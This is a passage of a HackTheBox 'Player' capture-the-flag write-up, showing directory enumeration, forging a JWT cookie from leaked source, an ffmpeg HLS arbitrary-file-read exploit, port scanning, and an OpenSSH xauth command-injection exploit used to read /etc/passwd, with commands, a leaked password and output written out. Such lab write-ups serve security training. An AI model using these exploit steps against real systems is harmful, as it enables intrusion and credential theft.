class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;player.htb&#x2F;</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;01&#x2F;17 19:17:29 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;launcher (Status: 301)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;01&#x2F;17 19:18:59 Finished</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player#</span><br></pre></td></tr></table></figure><p><code>http://player.htb/launcher</code>:<br><img src="/images/hackthebox/player/11.png" alt=""><br>I tried to submit that form but it did nothing, I just got redirected to <code>/launcher</code> again:<br>Request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/launcher/dee8dc8a47256c64630d803a4c40786c.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: player.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://player.htb/launcher/index.html</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IkMwQjEzN0ZFMkQ3OTI0NTlGMjZGRjc2M0NDRTQ0NTc0QTVCNUFCMDMifQ.cjGwng6JiMiOWZGz7saOdOuhyr1vad5hAxOJCiM3uzU</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Date</span>: Fri, 17 Jan 2020 22:45:04 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.7 (Ubuntu)</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.5.9-1ubuntu4.26</span><br><span class="line"><span class="attribute">Location</span>: index.html</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br></pre></td></tr></table></figure><p>We know from the chat that the source code is exposed somewhere, I wanted to read the source of <code>/launcher/dee8dc8a47256c64630d803a4c40786c.php</code> so I tried some basic stuff like adding <code>.swp</code>, <code>.bak</code> and <code>~</code> after the file name. <code>~</code> worked (check <a href="https://superuser.com/questions/546146/what-does-a-mean-after-a-file-name-in-unix-bash" target="_blank" rel="noopener">this</a> out):</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/player<span class="comment"># curl http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">"access"</span>]))</span><br><span class="line">&#123;</span><br><span class="line">        $key = <span class="string">'_S0_R@nd0m_P@ss_'</span>;</span><br><span class="line">        $decoded = JWT::decode($_COOKIE[<span class="string">"access"</span>], base64_decode(strtr($key, <span class="string">'-_'</span>, <span class="string">'+/'</span>)), [<span class="string">'HS256'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($decoded-&gt;access_code === <span class="string">"0E76658526655756207688271159624026011393"</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                header(<span class="string">"Location: 7F2xxxxxxxxxxxxx/"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">                header(<span class="string">"Location: index.html"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">        $token_payload = [</span><br><span class="line">          <span class="string">'project'</span> =&gt; <span class="string">'PlayBuff'</span>,</span><br><span class="line">          <span class="string">'access_code'</span> =&gt; <span class="string">'C0B137FE2D792459F26FF763CCE44574A5B5AB03'</span></span><br><span class="line">        ];</span><br><span class="line">        $key = <span class="string">'_S0_R@nd0m_P@ss_'</span>;</span><br><span class="line">        $jwt = JWT::encode($token_payload, base64_decode(strtr($key, <span class="string">'-_'</span>, <span class="string">'+/'</span>)), <span class="string">'HS256'</span>);</span><br><span class="line">        $cookiename = <span class="string">'access'</span>;</span><br><span class="line">        setcookie(<span class="string">'access'</span>,$jwt, time() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">"/"</span>);</span><br><span class="line">        header(<span class="string">"Location: index.html"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/player<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>It decodes the <code>JWT</code> token from the cookie <code>access</code> and redirects us to a redacted path if the value of <code>access_code</code> was <code>0E76658526655756207688271159624026011393</code>, otherwise it will assign an <code>access</code> cookie for us with <code>C0B137FE2D792459F26FF763CCE44574A5B5AB03</code> as the value of <code>access_code</code> and redirect us to <code>index.html</code>.<br>We have the secret <code>_S0_R@nd0m_P@ss_</code> so we can easily craft a valid cookie. I used <a href="https://jwt.io/" target="_blank" rel="noopener">jwt.io</a> to edit my token.<br><img src="/images/hackthebox/player/12.png" alt=""></p><p><img src="/images/hackthebox/player/13.png" alt=""><br>I used the cookie and got redirected to <code>/7F2dcsSdZo6nj3SNMTQ1</code>:<br>Request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/launcher/dee8dc8a47256c64630d803a4c40786c.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: player.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://player.htb/launcher/index.html</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: access=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwcm9qZWN0IjoiUGxheUJ1ZmYiLCJhY2Nlc3NfY29kZSI6IjBFNzY2NTg1MjY2NTU3NTYyMDc2ODgyNzExNTk2MjQwMjYwMTEzOTMifQ.VXuTKqw__J4YgcgtOdNDgsLgrFjhN1_WwspYNf_FjyE</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>Response:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">302</span> Found</span><br><span class="line"><span class="attribute">Date</span>: Fri, 17 Jan 2020 22:50:59 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.7 (Ubuntu)</span><br><span class="line"><span class="attribute">X-Powered-By</span>: PHP/5.5.9-1ubuntu4.26</span><br><span class="line"><span class="attribute">Location</span>: 7F2dcsSdZo6nj3SNMTQ1/</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/player/14.png" alt=""></p><h2 id="FFmpeg-HLS-Vulnerability-–-gt-Arbitrary-File-Read"><a href="#FFmpeg-HLS-Vulnerability-–-gt-Arbitrary-File-Read" class="headerlink" title="FFmpeg HLS Vulnerability –&gt; Arbitrary File Read"></a>FFmpeg HLS Vulnerability –&gt; Arbitrary File Read</h2><p>I uploaded a test <code>txt</code> file:<br><img src="/images/hackthebox/player/15.png" alt=""></p><p><img src="/images/hackthebox/player/16.png" alt=""><br>I got an <code>avi</code> file as a result which was weird:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http:\/\/player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/uploads/518515582.avi"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>I tried some other file formats and I also got an <code>avi</code> file.<br>So I tried the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS" target="_blank" rel="noopener"><code>ffmpeg HLS</code> exploit</a>, I created a test <code>avi</code> to read <code>/etc/passwd</code> and it worked:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player&#x2F;avi# .&#x2F;gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd test.avi</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player&#x2F;avi# file test.avi </span><br><span class="line">test.avi: RIFF (little-endian) data, AVI, 224 x 160, 25.00 fps,</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player&#x2F;avi#</span><br></pre></td></tr></table></figure><p><img src="/images/hackthebox/player/17.png" alt=""><br>I created 3 more <code>avi</code>s to read the files we got earlier from the error message from <code>staging</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player&#x2F;avi# .&#x2F;gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;staging&#x2F;contact.php contact.avi</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player&#x2F;avi# .&#x2F;gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;backup&#x2F;service_config service_config.avi</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player&#x2F;avi# .&#x2F;gen_xbin_avi.py file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;staging&#x2F;fix.php fix.avi</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player&#x2F;avi#</span><br></pre></td></tr></table></figure><p><code>contact.php</code> didn’t have anything interesting and the <code>avi</code> for <code>fix.php</code> was empty for some reason. In <code>service_config</code> there were some credentials for a user called <code>telegen</code>:<br><img src="/images/hackthebox/player/18.png" alt=""><br>I tried these credentials with <code>ssh</code> and with <code>dev.player.htb</code> and they didn’t work. I ran a quick full port scan with <code>masscan</code> and turns out that there was another open port:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# masscan -p1-65535 10.10.10.145 --rate&#x3D;1000 -e tun0</span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.5 (http:&#x2F;&#x2F;bit.ly&#x2F;14GZzcT) at 2020-01-18 00:09:24 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports&#x2F;host]</span><br><span class="line">Discovered open port 22&#x2F;tcp on 10.10.10.145                                    </span><br><span class="line">Discovered open port 80&#x2F;tcp on 10.10.10.145                                    </span><br><span class="line">Discovered open port 6686&#x2F;tcp on 10.10.10.145</span><br></pre></td></tr></table></figure><p>I scanned that port with <code>nmap</code> but it couldn’t identify the service:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">6686&#x2F;tcp open  tcpwrapped</span><br></pre></td></tr></table></figure><p>However when I connected to the port with <code>nc</code> the banner indicated that it was an <code>ssh</code> server:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# nc player.htb 6686</span><br><span class="line">SSH-2.0-OpenSSH_7.2</span><br><span class="line"></span><br><span class="line">Protocol mismatch.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player#</span><br></pre></td></tr></table></figure><p>I could login to that <code>ssh</code> server with the credentials, but unfortunately I was in a restricted environment:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# ssh telegen@player.htb -p 6686</span><br><span class="line">The authenticity of host &#39;[player.htb]:6686 ([10.10.10.145]:6686)&#39; can&#39;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:oAcCXvit3SHvyq7nuvWntLq+Q+mGlAg8301zhKnJmPM.</span><br><span class="line">Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#39;[player.htb]:6686,[10.10.10.145]:6686&#39; (ECDSA) to the list of known hosts.</span><br><span class="line">telegen@player.htb&#39;s password: </span><br><span class="line">Last login: Tue Apr 30 18:40:13 2019 from 192.168.0.104</span><br><span class="line">Environment:</span><br><span class="line">  USER&#x3D;telegen</span><br><span class="line">  LOGNAME&#x3D;telegen</span><br><span class="line">  HOME&#x3D;&#x2F;home&#x2F;telegen</span><br><span class="line">  PATH&#x3D;&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin</span><br><span class="line">  MAIL&#x3D;&#x2F;var&#x2F;mail&#x2F;telegen</span><br><span class="line">  SHELL&#x3D;&#x2F;usr&#x2F;bin&#x2F;lshell</span><br><span class="line">  SSH_CLIENT&#x3D;10.10.xx.xx 43270 6686</span><br><span class="line">  SSH_CONNECTION&#x3D;10.10.xx.xx 43270 10.10.10.145 6686</span><br><span class="line">  SSH_TTY&#x3D;&#x2F;dev&#x2F;pts&#x2F;4</span><br><span class="line">  TERM&#x3D;screen</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; PlayBuff &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Welcome to Staging Environment</span><br><span class="line"></span><br><span class="line">telegen:~$ whoami</span><br><span class="line">*** forbidden command: whoami</span><br><span class="line">telegen:~$ help</span><br><span class="line">  clear  exit  help  history  lpath  lsudo</span><br><span class="line">telegen:~$ lsudo</span><br><span class="line">Allowed sudo commands:</span><br><span class="line">telegen:~$ lpath</span><br><span class="line">Allowed:</span><br><span class="line"> &#x2F;home&#x2F;telegen</span><br><span class="line">telegen:~$ pwd</span><br><span class="line">*** forbidden command: pwd</span><br><span class="line">telegen:~$</span><br></pre></td></tr></table></figure><h2 id="OpenSSH-7-2p1-xauth-Command-Injection-–-gt-User-Flag"><a href="#OpenSSH-7-2p1-xauth-Command-Injection-–-gt-User-Flag" class="headerlink" title="OpenSSH 7.2p1 xauth Command Injection –&gt; User Flag"></a>OpenSSH 7.2p1 xauth Command Injection –&gt; User Flag</h2><p>When I searched for exploits for that version of <code>openssh</code> I found this <a href="https://www.exploit-db.com/exploits/39569" target="_blank" rel="noopener">exploit</a>.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# python 39569.py </span><br><span class="line"> Usage: &lt;host&gt; &lt;port&gt; &lt;username&gt; &lt;password or path_to_privkey&gt;</span><br><span class="line">        </span><br><span class="line">        path_to_privkey - path to private key in pem format, or &#39;.demoprivkey&#39; to use demo private key</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;player# python 39569.py player.htb 6686 telegen &#39;d-bC|jC!2uepS&#x2F;w&#39;</span><br><span class="line">INFO:__main__:connecting to: telegen:d-bC|jC!2uepS&#x2F;w@player.htb:6686</span><br><span class="line">INFO:__main__:connected!</span><br><span class="line">INFO:__main__:</span><br><span class="line">Available commands:</span><br><span class="line">    .info</span><br><span class="line">    .readfile &lt;path&gt;</span><br><span class="line">    .writefile &lt;path&gt; &lt;data&gt;</span><br><span class="line">    .exit .quit</span><br><span class="line">    &lt;any xauth command or type help&gt;</span><br><span class="line"></span><br><span class="line">#&gt; .readfile &#x2F;etc&#x2F;passwd</span><br><span class="line">DEBUG:__main__:auth_cookie: &#39;xxxx\nsource &#x2F;etc&#x2F;passwd\n&#39;</span><br><span class="line">DEBUG:__main__:dummy exec returned: None</span><br><span class="line">INFO:__main__:root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:</span><br><span class="line">syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:102:106::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">landscape:x:103:109::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;bin&#x2F;false</span><br><span class="line">telegen:x:1000:1000:telegen,,,:&#x2F;home&#x2F;telegen:&#x2F;usr&#x2F;bin&#x2F;lshell</span><br><span class="line">sshd:x:104:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:105:113:MySQL</span><br><span class="line">colord:x:106:116:colord</span><br><span class="line">staged-dev:x:4000000000:1001::&#x2F;home&#x2F;staged-dev:&#x2F;bin&#x2F;sh</span><br><span class="line">#&gt;</span><br></pre></td></tr></table></figure><p>I tried to use <code>.writefile</code> to write a <code>php</code> file and get a reverse shell but I couldn’t do that. But anyway I was finally able to read the user flag:<br><img src="/images/hackthebox/player/19.png" alt=""></p><h2 id="Credentials-in-fix-php-–-gt-RCE-–-gt-Shell-as-www-data"><a href="#Credentials-in-fix-php-–-gt-RCE-–-gt-Shell-as-www-data" class="headerlink" title="Credentials in fix.php –&gt; RCE –&gt; Shell as www-data"></a>Credentials in fix.php –&gt; RCE –&gt; Shell as www-data</h2><p>Earlier I couldn’t read <code>fix.php</code> through the <code>ffmpeg</code> exploit, I was able to read it as <code>telegen</code> and I found credentials for a user called <code>peter</code>:</p><figure class="highlight plain"><table><tr><td 